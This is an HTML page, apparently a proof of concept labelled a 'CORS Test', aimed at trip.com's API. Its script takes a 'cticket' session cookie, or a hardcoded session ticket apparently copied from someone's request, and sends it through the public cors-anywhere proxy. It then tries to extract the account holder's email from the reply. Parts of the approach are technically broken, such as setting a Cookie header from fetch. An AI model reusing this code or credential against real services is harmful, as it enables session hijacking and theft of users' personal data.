<!DOCTYPE html>
<html>
<body>
<h1>CORS Test - مع Cookie</h1>
<pre id="result"></pre>
<script>
// ===== دالة لجلب الـ Cookie من المتصفح =====
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

// ===== استخدام Proxy =====
const PROXY_URL = "https://cors-anywhere.herokuapp.com/";
const TARGET_URL = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?x-traceID=";

// ===== البيانات =====
const tripData = {
    head: {
        locale: "ar-XX",
        currency: "USD",
        vID: "1783978788105.8e68P1hvGdSY"
    },
    platform: "Online",
    componentType: "online-app-download-universal",
    version: "6.0.5",
    pageId: "10320668150",
    aid: 0,
    sid: 0,
    customId: "adBanner",
    customParam: {}
};

// ===== جلب الـ Cookies من المتصفح =====
const cticket = getCookie('cticket');
console.log("🍪 cticket من المتصفح:", cticket);

// ===== إذا ما في Cookie، نستخدم الـ Cookie من الطلب الأصلي =====
const cookieValue = cticket || "59C7A0BB9FF99FC0AE048DD6007FDFAEF48F51CD796D03C9E576E73128A9990F";
console.log("🍪 الـ Cookie المستخدمة:", cookieValue);

// ===== إرسال الطلب مع الـ Cookie =====
fetch(PROXY_URL + TARGET_URL, {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
        "Cookie": `cticket=${cookieValue}`
    },
    credentials: 'omit',
    body: JSON.stringify(tripData)
})
.then(r => r.text())
.then(responseText => {
    document.getElementById("result").textContent = "✅ Status: 200 OK\n\n" + responseText;
    
    try {
        const jsonResponse = JSON.parse(responseText);
        console.log("📦 الرد الكامل:", jsonResponse);
        
        // استخراج الإيميل
        if (jsonResponse.email) {
            console.log("📧 الإيميل موجود:", jsonResponse.email);
            document.getElementById("result").textContent += "\n\n📧 الإيميل المستخرج: " + jsonResponse.email;
        } else {
            console.log("⚠️ الإيميل غير موجود في الرد");
            document.getElementById("result").textContent += "\n\n⚠️ لم يتم العثور على إيميل (قد تحتاج Cookie صالحة)";
        }
        
        if (jsonResponse.ResponseStatus) {
            console.log("📊 الحالة:", jsonResponse.ResponseStatus.Ack);
        }
        
    } catch(e) {
        console.log("⚠️ الرد ليس JSON صالح");
    }
})
.catch(e => {
    document.getElementById("result").textContent = "❌ خطأ:\n" + e.message;
    console.error("❌ تفاصيل الخطأ:", e);
});
</script>
</body>
</html>
